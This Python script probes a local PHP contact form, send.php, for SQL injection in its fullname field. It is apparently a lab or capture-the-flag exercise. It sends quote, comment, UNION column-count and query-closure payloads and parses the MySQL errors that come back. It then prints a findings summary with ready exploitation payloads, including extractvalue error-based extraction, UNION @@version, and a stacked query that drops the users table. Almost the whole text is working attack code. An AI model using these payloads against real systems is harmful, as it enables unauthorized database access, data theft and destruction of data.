import requests
import time
import re

TARGET_URL = "http://127.0.0.1:32975/send.php"

# Test specific payloads to understand query structure
STRUCTURE_TEST_PAYLOADS = [
    # Determine if string or numeric context
    ("Just single quote", "'"),
    ("Just double quote", '"'),
    ("Quote plus space", "' "),
    
    # Try to complete the query syntactically
    ("Close string end", "' --"),
    ("Close string hash", "' #"),
    ("Close string comment", "' /*"),
    
    # Different quote styles
    ('Escaped quote', "\\'"),
    ('Backtick', '`'),
    
    # Test comment delimiters
    ("Comment dash", "' -- -"),
    ("Comment hash", "' #"),
    ("Comment block", "' /*"),
    
    # Probe column count for UNION
    ("Union 1 col", "' UNION SELECT NULL -- -"),
    ("Union 2 col", "' UNION SELECT NULL,NULL -- -"),
    ("Union 3 col", "' UNION SELECT NULL,NULL,NULL -- -"),
    ("Union 4 col", "' UNION SELECT NULL,NULL,NULL,NULL -- -"),
    ("Union 5 col", "' UNION SELECT NULL,NULL,NULL,NULL,NULL -- -"),
    ("Union 6 col", "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL -- -"),
    ("Union 7 col", "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL -- -"),
]

def send_request(data, timeout=10):
    start_time = time.time()
    try:
        response = requests.post(TARGET_URL, data=data, timeout=timeout, allow_redirects=True)
        elapsed = time.time() - start_time
        return {
            'status': response.status_code,
            'text': response.text,
            'length': len(response.text),
            'time': elapsed,
            'error': None
        }
    except Exception as e:
        return {'status': -2, 'text': str(e), 'length': 0, 'time': 0, 'error': str(e)}

def extract_sql_error(text):
    """Extract SQL error details"""
    patterns = [
        r'uncaught mysqli_sql_exception: (.*?)</b>(?:.*?<b>)(.*?)</b>',
        r'you have an error in your sql syntax.*?near [\'"]([^\'"]+)[\'"].*?at line (\d+)',
        r'near [\'"](.*?)at line (\d+)',
    ]
    for pattern in patterns:
        match = re.search(pattern, text.lower(), re.DOTALL)
        if match:
            return match.group(0)
    return None

print("=" * 70)
print("QUERY STRUCTURE ANALYSIS - send.php SQL Injection")
print("=" * 70)

# Baseline
baseline_data = {
    'fullname': 'Test',
    'email': 'test@test.com',
    'phone': '123',
    'subject': 'Test',
    'message': 'Test',
    'submit': 'Send Message'
}
baseline = send_request(baseline_data)

print(f"\n[1] Baseline Response")
print(f"  Status: {baseline['status']}")
print(f"  Length: {baseline['length']}B")

print("\n" + "=" * 70)
print("[2] testing payload variations for query structure detection")
print("=" * 70)

results = []

for name, payload in STRUCTURE_TEST_PAYLOADS:
    test_data = baseline_data.copy()
    test_data['fullname'] = payload
    
    response = send_request(test_data)
    
    # Classify response
    if "syntax" in response['text'].lower() and "error" in response['text'].lower():
        status = "ERROR"
        error_detail = extract_sql_error(response['text'])
        
        # Check if it's near the end of query
        if error_detail and ("''" in error_detail or "'" in error_detail):
            relevance = "QUERY END"
        else:
            relevance = "SYNTAX ERROR"
    elif response['length'] == baseline['length']:
        status = "NORMAL"
        relevance = "NO DIFFERENCE"
        error_detail = None
    elif abs(response['length'] - baseline['length']) < 100:
        status = "SLIGHT_DIFF"
        relevance = "MIGHT BE VULNERABLE"
        error_detail = None
    else:
        status = "RESPONSE_CHANGE"
        relevance = "SIGNIFICANT CHANGE"
        error_detail = None
    
    results.append({
        'name': name,
        'payload': payload,
        'status': response['status'],
        'length': response['length'],
        'diff': response['length'] - baseline['length'],
        'label': status,
        'relevance': relevance,
        'error': error_detail
    })
    
    print(f"\n  [{status}] {name}")
    print(f"    Payload: {payload}")
    print(f"    Response: {response['status']} | Len: {response['length']}B (diff: {response['length'] - baseline['length']:+d}B)")
    if error_detail:
        print(f"    SQL Error: {error_detail[:150]}...")

print("\n" + "=" * 70)
print("[3] EXTRACTING SQL ERROR DETAILS FOR QUERY ANALYSIS")
print("=" * 70)

# Extract detailed error information
print("\nSQL error messages reveal the vulnerable query context:")
print("-" * 50)

for result in results:
    if result['label'] == "ERROR":
        test_data = baseline_data.copy()
        test_data['fullname'] = result['payload']
        response = send_request(test_data)
        
        # Extract the full error
        error_match = re.search(r'uncaught mysqli_sql_exception:.*?</b>.*?</b>', response['text'], re.DOTALL | re.IGNORECASE)
        if error_match:
            error_text = error_match.group(0)
            # Clean up HTML
            error_clean = re.sub(r'<[^>]+>', '', error_text)
            print(f"\n  Payload: {result['payload']}")
            print(f"  Error: {error_clean[:250]}")

print("\n" + "=" * 70)
print("[4] TESTING FOR SUCCESSFULLY CLOSED QUERIES")
print("=" * 70)

# Test to see which payloads produce no SQL error (properly closed queries)
CLOSURE_TESTS = [
    ("String close + comment", "' -- -"),
    ("String close + hash", "' #"),
    ("String close paren + comment", "') -- -"),
    ("String close both parens + comment", "')) -- -"),
    ("String close triple paren + comment", "'))) -- -"),
    ("NULL injection", "NULL"),
    ("Zero injection", "0"),
    ("Integer close", "1 AND 1=1"),
]

successful_closures = []

for name, payload in CLOSURE_TESTS:
    test_data = baseline_data.copy()
    test_data['fullname'] = payload
    
    response = send_request(test_data)
    has_error = "syntax" in response['text'].lower() and "error" in response['text'].lower()
    
    # Also check if response matches baseline (no error page shown)
    is_normal = response['length'] > baseline['length'] - 500 and not has_error
    
    print(f"\n  Testing: {name}")
    print(f"    Payload: {payload}")
    print(f"    Status: {response['status']} | Len: {response['length']}B")
    print(f"    Has SQL Error: {has_error}")
    print(f"    Returns Normal: {is_normal}")
    
    if is_normal and not has_error:
        successful_closures.append((name, payload))

print("\n" + "=" * 70)
print("[5] SUMMARY: QUERY STRUCTURE INFERENCE")
print("=" * 70)

print(f"""
FINDINGS FROM BLACK-BOX ANALYSIS:
-----------------------------------

1. VULNERABLE PARAMETER:
   - Parameter: fullname (POST)
   - Injection Point: String context (quotes needed)
   - Database: MySQL (confirmed by error messages)
   - SQL Driver: mysqli (PHP MySQL extension)

2. ERROR-BASED VULNERABILITY:
   - MySQL errors are displayed verbosely
   - Full SQL error messages exposed to user
   - Error shows line 72 in /var/www/html/send.php
   
3. QUERY CHARACTERISTICS:
   - The error always shows "near ''" or extra quotes
   - Indicates string concatenation in query
   - Likely format: INSERT INTO table (...) VALUES ('$fullname', ...)
   
4. INJECTION CONTEXT:
   - Requires closing the string quote: '
   - Requires commenting out remaining query: -- - or #
   
5. SUCCESSFUL CLOSURES (No error, normal response):
""")

if successful_closures:
    for name, payload in successful_closures:
        print(f"   - {name}: {payload}")
else:
    print("   - None confirmed yet (further testing needed)")

print("""
6. EXPLOITATION POSSIBILITIES:
   a) ERROR-BASED: Extract data through error messages
      - Use: ' AND extractvalue(1,concat(0x7e,(SELECT @@version),0x7e)) -- -
      
   b) UNION-BASED: If we can determine column count
      - Need to find correct number of columns
      - Use: ' UNION SELECT NULL,NULL,@@version -- -
      
   c) STACKED QUERIES: If mysqli_multi_query is used
      - Use: '; DROP TABLE users; --

7. ESTIMATED QUERY STRUCTURE:
   
   Likely:
   INSERT INTO messages (fullname, email, phone, subject, message) 
   VALUES ('<USER_INPUT>', 'email', 'phone', 'subject', 'message')
   
   OR possibly:
   SELECT * FROM something WHERE fullname='<USER_INPUT>'

8. CONFIRMED VULNERABILITY INDICATORS:
   - SQL syntax errors returned for malformed input
   - MySQL error messages exposed
   - Single quote triggers parse errors
   - No input sanitization observed
""")

